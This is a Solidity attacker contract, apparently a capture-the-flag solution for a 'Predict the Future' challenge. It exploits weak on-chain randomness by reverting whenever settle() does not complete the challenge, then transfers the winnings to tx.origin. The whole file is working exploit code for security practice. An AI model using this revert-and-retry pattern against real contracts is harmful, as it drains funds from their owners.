// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.19;

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge challenge;

    constructor(address _challenge) {
        challenge = IPredictTheFutureChallenge(_challenge);
    }
    
    function lockInGuess(uint8 n) external payable {
        // need to call it from this contract because guesser is stored and checked
        // when settling
        challenge.lockInGuess{value: 1 ether}(n);
    }
    
    function attack() external payable {
        challenge.settle();
    
        // if we guessed wrong, revert
        require(challenge.isComplete(), "challenge not completed");
        // return all of it to EOA
        payable(tx.origin).transfer(address(this).balance);
    }
    
    receive() external payable {}
}

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}